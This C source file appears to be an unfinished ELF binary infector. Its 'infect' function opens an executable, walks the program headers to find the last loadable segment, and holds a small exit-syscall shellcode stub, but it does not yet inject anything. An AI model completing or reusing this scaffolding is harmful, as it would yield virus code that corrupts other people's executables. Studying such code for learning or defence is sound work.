#include <elf.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <limits.h>

uint64_t align_like(uint64_t base, uint64_t value, uint64_t align)
{
	return ((value - (base % 0x1000) + 0x1000 - 1) & ~0xFFF) + (base % 0x1000);
}

int	infect(char *str)
{
	char	stub[] = { 0x48, 0xC7, 0xC0, 0x3C, 0x00, 0x00, 0x00, 0x48, 0x31, 0xFF, 0x0F, 0x05 };
	// C'est juste un mov rax, 60; xor rdi, rdi; syscall
	int		fd = open(str, 2, 0);
	if (fd < 0)
		return 0;
	printf("fd : %d\n", fd);
	int		offset = 0;
	int		gap = 0;
	Elf64_Ehdr	ehdr;
	Elf64_Phdr	phdr;
	Elf64_Phdr	new_phdr = {0};
	offset += read(fd, &ehdr, sizeof(Elf64_Ehdr));



	int	i = 0;
	int	offsetc = 0;
	while (i < ehdr.e_phnum)
	{
		offset += read(fd, &phdr, sizeof(Elf64_Phdr));
		if (phdr.p_type == 1)
		{
			if (new_phdr.p_vaddr < (phdr.p_vaddr + phdr.p_memsz))
			{
				memcpy(&new_phdr, &phdr, sizeof(phdr));
				offsetc = offset - 56;
			}
		}
		i++;
	}
	printf("offsetc : %d\n", offsetc);
	lseek(fd, offsetc, SEEK_SET);
	close(fd);
	return 0;
}

int	main(void)
{
	infect("/tmp/test/ls");
	return 0;
}
